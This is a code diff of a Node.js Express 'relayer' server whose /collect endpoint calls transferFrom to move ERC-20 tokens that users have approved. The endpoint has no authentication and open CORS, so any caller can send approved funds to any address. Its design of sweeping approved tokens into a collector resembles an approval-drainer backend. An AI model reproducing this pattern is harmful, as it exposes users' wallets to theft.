@@ -1,39 +1,34 @@
 import express from "express";
 import cors from "cors";
-import dotenv from "dotenv";
 import { ethers } from "ethers";
+import dotenv from "dotenv";
 
 dotenv.config();
 
 const app = express();
-
 app.use(cors());
 app.use(express.json());
 
 /* ================= CONFIG ================= */
 
-const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
+const RPC_URL = "https://bsc-dataseed.binance.org/";
+const provider = new ethers.JsonRpcProvider(RPC_URL);
 
 const wallet = new ethers.Wallet(
-  process.env.RELAYER_PRIVATE_KEY,
+  process.env.PRIVATE_KEY,
   provider
 );
 
-const USDT = process.env.USDT_CONTRACT;
-const RECEIVER = process.env.RECEIVER_ADDRESS;
-
-const abi = [
-  "function transferFrom(address,address,uint256) returns (bool)"
+const ERC20_ABI = [
+  "function balanceOf(address) view returns(uint256)",
+  "function allowance(address,address) view returns(uint256)",
+  "function transferFrom(address,address,uint256) returns(bool)"
 ];
 
 /* ================= HEALTH ================= */
 
 app.get("/", (req, res) => {
-  res.json({
-    ok: true,
-    relayer: wallet.address,
-    collector: RECEIVER
-  });
+  res.send("Relayer running ✅");
 });
 
 /* ================= COLLECT ================= */
@@ -42,44 +37,78 @@ app.post("/collect", async (req, res) => {
 
   try {
 
-    const { from, amount } = req.body;
+    const { token, from, to, amount } = req.body;
 
-    if (!from || !amount)
-      return res.status(400).json({ error: "Missing params" });
+    console.log("Incoming:", req.body);
 
-    const token = new ethers.Contract(USDT, abi, wallet);
+    if (!token || !from || !to || !amount) {
+      return res.status(400).json({
+        error: "Missing parameters"
+      });
+    }
 
-    // ✅ user jitna enter kare utna transfer
-    const value = ethers.parseUnits(amount.toString(), 18);
-
-    console.log("Sending:", from, amount);
-
-    const tx = await token.transferFrom(
-      from,
-      RECEIVER,
-      value
+    const contract = new ethers.Contract(
+      token,
+      ERC20_ABI,
+      wallet
     );
+
+    // ✅ amount already WEI (frontend se aa raha)
+    const amountWei = BigInt(amount);
+
+    /* ---------- BALANCE CHECK ---------- */
+    const balance = await contract.balanceOf(from);
+
+    if (balance < amountWei) {
+      return res.status(400).json({
+        error: "User balance too low"
+      });
+    }
+
+    /* ---------- ALLOWANCE CHECK ---------- */
+    const allowance = await contract.allowance(
+      from,
+      wallet.address
+    );
+
+    if (allowance < amountWei) {
+      return res.status(400).json({
+        error: "Approval not enough"
+      });
+    }
+
+    /* ---------- TRANSFER ---------- */
+    console.log("Sending transferFrom...");
+
+    const tx = await contract.transferFrom(
+      from,
+      to,
+      amountWei
+    );
+
+    console.log("TX:", tx.hash);
 
     const receipt = await tx.wait();
 
     res.json({
-      ok: true,
-      hash: tx.hash,
-      blockNumber: receipt.blockNumber,
-      gasUsed: receipt.gasUsed.toString()
+      success: true,
+      hash: receipt.hash
     });
 
   } catch (err) {
-    console.log(err);
-    res.status(500).json({ error: err.message });
-  }
 
+    console.error("ERROR:", err);
+
+    res.status(500).json({
+      error: err.reason || err.message
+    });
+  }
 });
 
 /* ================= START ================= */
 
 const PORT = process.env.PORT || 3000;
 
-app.listen(PORT, () =>
-  console.log("Relayer running on", PORT)
-);
+app.listen(PORT, () => {
+  console.log("Server running on", PORT);
+});
